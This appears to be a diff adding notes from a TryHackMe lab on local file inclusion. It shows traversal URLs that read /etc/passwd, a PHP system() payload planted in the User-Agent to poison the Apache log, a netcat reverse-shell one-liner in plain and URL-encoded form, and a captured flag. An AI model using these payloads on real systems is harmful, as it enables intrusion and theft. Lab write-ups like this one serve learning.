@@ -1,0 +1,60 @@
+[LFI-Basics]
+[Task 1 LFI]
+Possible impact
+You might consider this is not a serious threat, but exploit LFI can lead to:
+[-] Denial of service
+[-] Remote code execution
+[-] Sensitive information disclosure
+#10.10.172.25/lfi/lfi.php?page=home.html
+#http://10.10.172.25/lfi/lfi.php?page=/etc/passwd
+#Vulnerable PHP file:$local_file = $_REQUEST["page"];
+[Task 2 LFI Directory Traversal]
+Directory traversal or Path Traversal is an HTTP attack 
+which allows attackers to access restricted directories and 
+execute commands outside of the web server’s root directory or other paths.
+#http://10.10.172.25/lfi2/lfi.php?page=../creditcard
+1111-2222-3333-4444 
+#Vulnerable code:$local_file = "html/".$_REQUEST["page"];
+[Task 3 LFI Log Poisoning]
+Log Poisoning is a common technique used to gain a 
+reverse shell from a LFI vulnerability. 
+To make it work an attacker attempts to 
+inject malicious input to the server log.
+#http://10.10.172.25/lfi/lfi.php/?page=/var/log/apache2/access.log
+Result:
+10.4.30.186 - - [17/Mar/2021:09:52:30 -0700] "GET / HTTP/1.1" 200 588 "-" 
+"Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 
+[Burp Suite]
+------------------------------------------------
+GET /lfi/lfi.php?page=/var/log/apache2/access.log&lfi=uname%20-r HTTP/1.1
+Host: 10.10.172.25
+User-Agent:  <?php system($_GET['lfi']) ?> Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+Cache-Control: max-age=0
+------------------------------------------------
+
+[Burp Suite Reverse Shell]
+------------------------------------------------
+#rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.4.30.186 4444 >/tmp/f
+Encode as Url
+GET /lfi/lfi.php?page=/var/log/apache2/access.log&lfi=%72%6d%20%2f%74%6d%70%2f%66%3b%6d%6b%66%69%66%6f%20%2f%74%6d%70%2f%66%3b%63%61%74%20%2f%74%6d%70%2f%66%7c%2f%62%69%6e%2f%73%68%20%2d%69%20%32%3e%26%31%7c%6e%63%20%31%30%2e%34%2e%33%30%2e%31%38%36%20%34%34%34%34%20%3e%2f%74%6d%70%2f%66%0a HTTP/1.1
+Host: 10.10.172.25
+User-Agent:  <?php system($_GET['lfi']) ?> Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+Cache-Control: max-age=0
+tty shell in python
+#$python -c 'import pty;pty.spawn("/bin/bash");'
+www-data@ubuntu:/home/lfi$ cat flag.txt 
+cat flag.txt
+THM{a352a5c2acfd22251c3a94105b718fea}
+
+
+
